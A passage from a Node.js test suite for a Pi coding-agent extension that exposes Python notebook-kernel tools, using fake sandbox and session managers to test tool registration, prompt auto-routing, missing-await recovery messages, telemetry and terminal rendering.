const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

// These are host-extension tests, not nested-agent behavior tests. A depth of
// zero also suppresses unrelated background subagent-environment provisioning.
process.env.PI_SUBAGENT_DEPTH = "0";

function setModuleExports(modulePath, exports) {
  const resolved = require.resolve(modulePath);
  const previous = require.cache[resolved];
  require.cache[resolved] = {
    id: resolved,
    filename: resolved,
    loaded: true,
    exports,
  };
  return () => {
    if (previous) {
      require.cache[resolved] = previous;
    } else {
      delete require.cache[resolved];
    }
  };
}

function makeFakeSessionManager(sandbox) {
  return class FakePythonSessionManager {
    static lastInstance = null;

    constructor(sandboxManager, toolRegistry, settings, extensionRoot, hooks) {
      this.sandboxManager = sandboxManager;
      this.toolRegistry = toolRegistry;
      this.settings = settings;
      this.extensionRoot = extensionRoot;
      this.hooks = hooks ?? {};
      FakePythonSessionManager.lastInstance = this;
      if (sandbox.instances !== undefined) {
        sandbox.instances += 1;
      }
    }

    async provision(options) {
      this.provisionedKernels ??= [];
      const id = `s${this.provisionedKernels.length + 1}`;
      this.provisionedKernels.push({ id, name: options.name, notebookPath: options.notebookPath, chunks: 0, running: false });
      return { id, name: options.name, notebookPath: options.notebookPath };
    }

    async execForeground(sessionId, code) {
      return this.execute(sessionId, code);
    }

    async readCellOutput(cellIdx, options) {
      return {
        text: `cell ${cellIdx} offset ${options.offset ?? 1} limit ${options.limit ?? "default"}`,
        notebookPath: "/tmp/test.ipynb",
        cellIdx,
      };
    }

    async promoteToSkillNotebook(options) {
      return {
        name: options.name,
        path: `/tmp/library/${options.name}.ipynb`,
        notebookPath: options.notebookPath ?? "/tmp/test.ipynb",
        overwritten: false,
      };
    }

    list() {
      return this.provisionedKernels?.length ? this.provisionedKernels :
        [{ id: "s1", name: "s1", notebookPath: "/tmp/test.ipynb", chunks: 1, running: false }];
    }

    get(id) {
      return id === "s1" ? { id: "s1" } : undefined;
    }

    mostRecentActive() {
      return null;
    }

    getPythonExecutable(id) {
      return id === "s1" ? "/fake/venv/python" : undefined;
    }

    allSubagentSnapshots() {
      return [];
    }

    getSubagentSnapshot() {
      return null;
    }

    async markBackgrounded() {
      return null;
    }

    async dispose() {}

    async disposeAll() {}

    async execute(_sessionId, _code) {
      return {
        output: "ok",
        details: {
          nestedToolCalls: 0,
          nestedToolNames: [],
          nestedResultChars: 0,
          nestedResultCount: 0,
          nestedErrors: 0,
          durationMs: 1,
          estimatedAvoidedTokens: 0,
        },
      };
    }
  };
}

function buildPi({ eventHandlers, registered, activeTools }) {
  const commands = {};
  const pi = {
    registerTool(tool) {
      registered.push(tool);
    },
    registerCommand(name, definition) {
      commands[name] = definition;
    },
    commands,
    on(event, handler) {
      eventHandlers.set(event, handler);
    },
    getAllTools() {
      return [{ name: "exec_cell" }];
    },
    getActiveTools() {
      return [...activeTools];
    },
    setActiveTools(next) {
      activeTools.splice(0, activeTools.length, ...next);
    },
  };
  return { pi, commands };
}

function restoreInjectedModules(sandbox, overrides = {}) {
  const restoreSandbox = setModuleExports("../dist/sandbox-manager.js", {
    createSandbox: async () => sandbox,
  });
  const restoreManager = setModuleExports("../dist/custom-tool-manager.js", {
    CustomToolManager: class FakeCustomToolManager {
      async start() {}
      close() {}
    },
  });
  const restoreRegistry = setModuleExports("../dist/tool-registry.js", {
    ToolRegistry: class FakeToolRegistry {
      getCallableTools() {
        return [{ name: "read", source: "builtin", isReadOnly: true }];
      }

      getAutoRoutableToolNames() {
        return ["read", "grep"];
      }
    },
  });
  const FakeSessionManager = makeFakeSessionManager(sandbox);
  for (const [method, implementation] of Object.entries(overrides)) {
    FakeSessionManager.prototype[method] = implementation;
  }
  const restoreSessions = setModuleExports("../dist/python-session-manager.js", {
    ...require("../dist/python-session-manager.js"),
    PythonSessionManager: FakeSessionManager,
  });
  return () => {
    restoreSandbox();
    restoreManager();
    restoreRegistry();
    restoreSessions();
  };
}

async function loadExtension() {
  delete require.cache[require.resolve("../dist/index.js")];
  const extensionModule = require("../dist/index.js");
  const ptcExtension = extensionModule.default || extensionModule;
  return ptcExtension;
}

function toolResultDetails(result) {
  return result.details;
}

test("ptc extension bootstraps session tools, the /ptc command, and cleans up runtime components", async () => {
  const sandbox = {
    cleanupCalls: 0,
    spawn() {
      throw new Error("sandbox spawn should not be used in bootstrap test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
    async cleanup() {
      this.cleanupCalls += 1;
    },
  };

  let managerInstance = null;

  class FakeCustomToolManager {
    constructor(extensionRoot, pi, toolRegistry, onToolSetChanged) {
      this.extensionRoot = extensionRoot;
      this.pi = pi;
      this.toolRegistry = toolRegistry;
      this.onToolSetChanged = onToolSetChanged;
      this.started = 0;
      this.closed = 0;
      managerInstance = this;
    }

    async start() {
      this.started += 1;
      this.onToolSetChanged();
    }

    close() {
      this.closed += 1;
    }
  }

  const restoreManager = setModuleExports("../dist/custom-tool-manager.js", {
    CustomToolManager: FakeCustomToolManager,
  });
  const FakeToolRegistry = class {
    getCallableTools() {
      return [];
    }

    getAutoRoutableToolNames() {
      return ["read", "grep"];
    }
  };
  const restoreRegistry = setModuleExports("../dist/tool-registry.js", {
    ToolRegistry: FakeToolRegistry,
  });
  const FakeSessionManager = makeFakeSessionManager(sandbox);
  const restoreSessions = setModuleExports("../dist/python-session-manager.js", {
    ...require("../dist/python-session-manager.js"),
    PythonSessionManager: FakeSessionManager,
  });
  const restoreSandbox = setModuleExports("../dist/sandbox-manager.js", {
    createSandbox: async () => sandbox,
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi, commands } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const toolNames = registered.map((tool) => tool.name).sort();
    assert.deepEqual(
      toolNames.sort(),
      [
        "delete_cell",
        "exec_cell",
        "inspect_kernel",
        "promote_to_skill_notebook",
        "provision_dependency",
        "provision_kernel",
        "read_cell",
        "read_cell_output",
        "read_cells",
        "request_cell_review",
        "reset_kernel",
        "run_all",
        "run_cell",
        "run_to",
        "scratch_run",
        "write_cell",
      ].sort(),
    );
    const readCellOutput = registered.find((tool) => tool.name === "read_cell_output");
    assert.deepEqual(Object.keys(readCellOutput.parameters.properties), ["cellIdx", "kernel", "offset", "limit"]);
    const readResult = await readCellOutput.execute(
      "read-output",
      { cellIdx: 3, kernel: "s1", offset: 2, limit: 4 },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    assert.equal(readResult.content[0].text, "cell 3 offset 2 limit 4");
    assert.equal(typeof readCellOutput.renderResult, "function");
    const readLines = readCellOutput.renderResult(readResult, { expanded: true }, {
      fg: (_color, text) => text,
    }).render(80).join("\n");
    assert.match(readLines, /Out\[3\]:/);
    assert.match(readLines, /cell 3 offset 2 limit 4/);
    assert.ok(!readLines.includes("In["));

    const provisionKernel = registered.find((tool) => tool.name === "provision_kernel");
    assert.deepEqual(Object.keys(provisionKernel.parameters.properties), ["name", "notebook", "source", "version"]);
    const promote = registered.find((tool) => tool.name === "promote_to_skill_notebook");
    assert.deepEqual(Object.keys(promote.parameters.properties), ["kernel", "name", "overwrite"]);
    const promoted = await promote.execute(
      "promote",
      { kernel: "s1", name: "review-workflow" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );
    assert.equal(promoted.details.path, "/tmp/library/review-workflow.ipynb");

    assert.ok(commands.ptc);
    assert.equal(managerInstance.started, 1);

    await eventHandlers.get("session_shutdown")();
    assert.equal(managerInstance.closed, 1);
    assert.equal(sandbox.cleanupCalls, 1);
  } finally {
    restoreSandbox();
    restoreManager();
    restoreRegistry();
    restoreSessions();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension auto-routes repo-wide analysis prompts toward exec_cell", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in bootstrap test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox);

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const inspectKernel = registered.find((tool) => tool.name === "inspect_kernel");
    assert.match(execCell.description, /Host tools callable from Python in this kernel: read/);
    assert.match(inspectKernel.description, /Available Python helpers:/);

    const routeResult = eventHandlers.get("before_agent_start")({
      prompt: "Analyze the first 8 test/**/*.test.ts files and return compact JSON only",
      systemPrompt: "base prompt",
    });

    assert.deepEqual(activeTools, ["exec_cell", "provision_kernel", "read_cell_output"]);
    assert.match(routeResult.systemPrompt, /strong fit for exec_cell/);
    assert.match(routeResult.systemPrompt, /provision_kernel/);

    eventHandlers.get("agent_end")();
    assert.deepEqual(activeTools, ["read", "grep"]);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

function restoreInjectedModulesNoOverrides(sandbox) {
  return restoreInjectedModules(sandbox);
}

test("ptc extension does not auto-route or auto-recover mutation prompts", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in mutation prompt test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "TypeError: object of type 'coroutine' has no len()",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const routeResult = eventHandlers.get("before_agent_start")({
      prompt: "Fix the failing tests across src/**/*.ts and return compact JSON only",
      systemPrompt: "base prompt",
    });

    assert.equal(routeResult, undefined);
    assert.deepEqual(activeTools, ["read", "grep"]);

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { kernel: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const contextResult = eventHandlers.get("context")({ messages: [] });
    assert.equal(contextResult, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension resets recovery state for each user request", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery state test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    async execForeground() {
      return successResult();
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    const firstResult = await pythonExecTool.execute("call-1", { kernel: "s1", code: "return 1" }, undefined, undefined, { cwd: process.cwd() });
    const secondResult = await pythonExecTool.execute("call-2", { kernel: "s1", code: "return 2" }, undefined, undefined, { cwd: process.cwd() });

    const firstTelemetry = firstResult.details.telemetry;
    assert.deepEqual(firstTelemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
    assert.deepEqual(secondResult.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 2,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });

    eventHandlers.get("agent_end")();
    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    const thirdResult = await pythonExecTool.execute("call-3", { kernel: "s1", code: "return 3" }, undefined, undefined, { cwd: process.cwd() });

    assert.deepEqual(thirdResult.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension appends one targeted recovery message on the next turn after a qualifying async failure", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");
  const recoveryPrompt =
    "PTC recovery: You called an async helper without await. Helpers like read, glob, find, grep, and ls are async wrappers. Await each helper call before using its result.";

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery lifecycle test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "TypeError: object of type 'coroutine' has no len()",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { kernel: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({
      messages: [{ role: "user", content: [{ type: "text", text: "Analyze files" }] }],
    });
    assert.equal(firstContext.messages.length, 2);
    assert.deepEqual(firstContext.messages[1], {
      role: "custom",
      customType: "ptc-recovery",
      content: recoveryPrompt,
      display: true,
      timestamp: firstContext.messages[1].timestamp,
    });
    assert.equal(typeof firstContext.messages[1].timestamp, "number");

    const secondContext = eventHandlers.get("context")({
      messages: [{ role: "user", content: [{ type: "text", text: "Analyze files" }] }],
    });
    assert.equal(secondContext, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension does not append a second automatic recovery message after recovery was already used", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery lifecycle test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  let attempts = 0;
  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      attempts += 1;
      throw new PtcPythonError(
        "TypeError: 'coroutine' object is not iterable",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { kernel: "s1", code: "paths = sorted(glob('src/**/*.ts'))\nreturn paths[:3]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(firstContext.messages.length, 1);
    assert.equal(firstContext.messages[0].customType, "ptc-recovery");

    await assert.rejects(
      pythonExecTool.execute(
        "call-2",
        { kernel: "s1", code: "paths = sorted(glob('src/**/*.ts'))\nreturn paths[:3]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    assert.equal(attempts, 2);
    const secondContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(secondContext, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension includes recovery telemetry in successful exec_cell details after one bounded retry", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in recovery telemetry test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  let attempts = 0;
  const restore = restoreInjectedModules(sandbox, {
    async execForeground() {
      attempts += 1;
      if (attempts === 1) {
        throw new PtcPythonError(
          "TypeError: object of type 'coroutine' has no len()",
          'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
        );
      }
      return successResult();
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { kernel: "s1", code: "path = 'README.md'\ncontent = read(path)\nreturn len(content)" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const firstContext = eventHandlers.get("context")({ messages: [] });
    assert.equal(firstContext.messages[0].customType, "ptc-recovery");

    const result = await pythonExecTool.execute(
      "call-2",
      { kernel: "s1", code: "path = 'README.md'\ncontent = await read(path)\nreturn len(content)" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.deepEqual(result.details.recovery, {
      eligible: true,
      attempted: true,
      failureClass: "missing-await",
    });
    assert.deepEqual(result.details.telemetry, {
      autoRouted: false,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 2,
      recoveryAttemptCount: 1,
      terminalState: "success",
    });
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension includes first-path telemetry in non-recovered exec_cell details", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in telemetry test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox);

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const activeTools = ["read", "grep"];
    const { pi } = buildPi({ eventHandlers, registered, activeTools });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    eventHandlers.get("before_agent_start")({
      prompt: "Analyze the first 8 test/**/*.test.ts files and return compact JSON only",
      systemPrompt: "base prompt",
    });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    const result = await pythonExecTool.execute(
      "call-1",
      { kernel: "s1", code: "return 1" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.deepEqual(result.details.recovery, {
      eligible: false,
      attempted: false,
      failureClass: null,
    });
    assert.deepEqual(result.details.telemetry, {
      autoRouted: true,
      firstToolPath: "code_execution",
      routedToCodeExecution: true,
      codeExecutionAttempts: 1,
      recoveryAttemptCount: 0,
      terminalState: "success",
    });
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("ptc extension does not auto-recover literal zero-match path failures", async () => {
  const previousAutoRecover = process.env.PTC_AUTO_RECOVER;
  process.env.PTC_AUTO_RECOVER = "true";

  const { PtcPythonError } = require("../dist/execution/execution-errors.js");

  const sandbox = {
    async cleanup() {},
    spawn() {
      throw new Error("sandbox spawn should not be used in zero-match recovery test");
    },
    getRuntimeWorkspaceRoot(cwd) {
      return cwd;
    },
  };

  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      throw new PtcPythonError(
        "FileNotFoundError: [Errno 2] No such file or directory: 'src/**/*.missing.ts'",
        'Traceback (most recent call last):\n  File "<stdin>", line 2, in user_main'
      );
    },
  });

  try {
    const extensionModule = require("../dist/index.js");
    const ptcExtension = extensionModule.default || extensionModule;

    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });

    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const pythonExecTool = registered.find((tool) => tool.name === "exec_cell");
    assert.ok(pythonExecTool);

    eventHandlers.get("before_agent_start")({ prompt: "Analyze files", systemPrompt: "base prompt" });
    await assert.rejects(
      pythonExecTool.execute(
        "call-1",
        { kernel: "s1", code: "paths = await glob('src/**/*.missing.ts')\nreturn paths[0]" },
        undefined,
        undefined,
        { cwd: process.cwd() }
      ),
      PtcPythonError
    );

    const contextResult = eventHandlers.get("context")({ messages: [] });
    assert.equal(contextResult, undefined);
  } finally {
    if (previousAutoRecover === undefined) {
      delete process.env.PTC_AUTO_RECOVER;
    } else {
      process.env.PTC_AUTO_RECOVER = previousAutoRecover;
    }
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("exec_cell file mode records and validates the real file contents", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  let captured;
  const restore = restoreInjectedModules(sandbox, {
    async execForeground(sessionId, code, options) {
      captured = { sessionId, code, options };
      return successResult();
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });

    const execCell = registered.find((tool) => tool.name === "exec_cell");
    await execCell.execute(
      "file-call",
      { kernel: "s1", file: "test/index.test.ts" },
      undefined,
      undefined,
      { cwd: process.cwd() }
    );

    assert.match(captured.code, /const test = require\("node:test"\)/);
    assert.equal(captured.options.file, require("node:path").resolve("test/index.test.ts"));
    assert.notEqual(captured.code, "(exec_cell file mode)\n");
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("registered source-bearing tools stream input through Pi's real tool shell", async (t) => {
  const sandbox = {
    async cleanup() {},
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox);
  const { initTheme, ToolExecutionComponent } = await import("@earendil-works/pi-coding-agent");
  const { setNotebookTuiModeProvider } = require("../dist/execution/notebook-render.js");
  const stripAnsi = (text) => text.replace(/\x1b\[[0-9;]*m/g, "");
  initTheme("light", false);
  try {
    const registered = [];
    const eventHandlers = new Map();
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await (await loadExtension())(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    setNotebookTuiModeProvider(() => "fullscreen");
    for (const [name, field] of [["exec_cell", "code"], ["scratch_run", "code"], ["write_cell", "source"]]) {
      await t.test(name, () => {
        const definition = registered.find((tool) => tool.name === name);
        const host = new ToolExecutionComponent(name, `stream-${name}`, {}, {}, definition,
          { requestRender() {} }, process.cwd());
        const paint = () => host.render(80).map(stripAnsi);
        assert.equal(paint().filter((line) => /^ In/.test(line)).length, 0);
        assert.equal(paint().filter((line) => line.trim() === name).length, 1, "title is visible before arguments arrive");
        for (const code of ["first = 1", "first = 1\nsecond = 2"]) {
          host.updateArgs({ kernel: "s1", at: 2, [field]: code });
          const lines = paint();
          assert.equal(lines.filter((line) => line.trim().startsWith(name)).length, 1);
          assert.equal(lines.filter((line) => /^ In/.test(line)).length, 1, "input previews must stream before execution");
          assert.ok(lines.some((line) => line.includes(code.split("\n").at(-1))));
        }
        const code = Array.from({ length: 24 }, (_, i) => `stream_line_${i} = ${i}`).join("\n");
        host.updateArgs({ kernel: "s1", at: 2, [field]: code });
        let lines = paint();
        assert.ok(lines.some((line) => line.includes("stream_line_23 =")), "streaming follows the newest line");
        assert.ok(!lines.some((line) => line.includes("stream_line_0 =")));
        host.setArgsComplete();
        host.markExecutionStarted();
        if (name !== "write_cell") {
          // Early progress may carry output before execution attaches userCode.
          host.updateResult({ content: [], details: { liveOutput: ["starting"] } }, true);
          assert.ok(paint().some((line) => line.includes("stream_line_")), "progress retains the streamed input");
          assert.equal(paint().filter((line) => /^ In/.test(line)).length, 1);
          assert.equal(paint().filter((line) => line.trim().startsWith(name)).length, 1, "title survives execution progress");
        }
        const details = name === "write_cell"
          ? { cellSource: code, cellType: "code", replaced: false, at: 2 }
          : { userCode: code.split("\n"), cellIdx: name === "exec_cell" ? 8 : undefined };
        host.updateResult({ content: [{ type: "text", text: "done" }], details }, false);
        lines = paint();
        assert.equal(lines.filter((line) => /^ In/.test(line)).length, 1, "result replaces the streaming preview");
        assert.equal(lines.filter((line) => line.trim().startsWith(name)).length, 1, "title survives completion without duplication");
      });
    }
  } finally {
    setNotebookTuiModeProvider(undefined);
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("completed exec_cell rendering omits missing durations instead of printing NaN", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox);

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const theme = { fg(_color, text) { return text; } };
    const rendered = execCell.renderResult(
      {
        content: [{ type: "text", text: "validation failed" }],
        details: {
          nestedToolCalls: 0,
          nestedToolNames: [],
          nestedResultChars: 0,
          nestedResultCount: 0,
          nestedErrors: 1,
          estimatedAvoidedTokens: 0,
        },
      },
      { isPartial: false },
      theme
    ).render(100).join("\n");
    assert.doesNotMatch(rendered, /NaN/);
  } finally {
    restore();
    delete require.cache[require.resolve("../dist/index.js")];
  }
});

test("exec_cell partial rendering streams the live Out box below the code view", async () => {
  const sandbox = {
    async cleanup() {},
    spawn() { throw new Error("sandbox spawn should not be used"); },
    getRuntimeWorkspaceRoot(cwd) { return cwd; },
  };
  const restore = restoreInjectedModules(sandbox, {
    execForeground() {
      return new Promise(() => {}); // never settles; we only render partials
    },
  });

  try {
    const ptcExtension = await loadExtension();
    const eventHandlers = new Map();
    const registered = [];
    const { pi } = buildPi({ eventHandlers, registered, activeTools: [] });
    await ptcExtension(pi);
    await eventHandlers.get("session_start")({}, { cwd: process.cwd() });
    const execCell = registered.find((tool) => tool.name === "exec_cell");
    const theme = { fg(_color, text) { return text; } };

    const partialDetails = {
      userCode: ["import tqdm", "for _ in tqdm(range(3)):\n    pass"],
      currentLine: 2,
      totalLines: 2,
      liveOutput: ["100%|##########| 3/3"],
      liveOutputHidden: 0,
    };
    const rendered = execCell.renderResult(
      { content: [{ type: "text", text: "Executing line 2/2" }], details: partialDetails },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");

    // The live Out box renders BELOW the executing-code view, with the
    // emulated screen content (not raw control sequences) inside the fence.
    assert.match(rendered, /Out\[ \]:/);
    assert.match(rendered, /100\|?%/);
    assert.match(rendered, /100%\|##########\| 3\/3/);
    assert.doesNotMatch(rendered, /\x1b\[K/);

    // Truncation marker when the tail cap hid earlier lines.
    const truncated = execCell.renderResult(
      { content: [{ type: "text", text: "Executing" }], details: { ...partialDetails, liveOutputHidden: 7 } },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");
    assert.match(truncated, /\.\.\. 7 earlier output lines/);

    // No live output yet: no Out box at all.
    const quiet = execCell.renderResult(
      { content: [{ type: "text", text: "Executing line 1/1" }], details: { userCode: ["pass"], currentLine: 1, totalLines: 1 } },
      { isPartial: true, expanded: false },
      theme,
      { state: {} }
    ).render(80).join("\n");
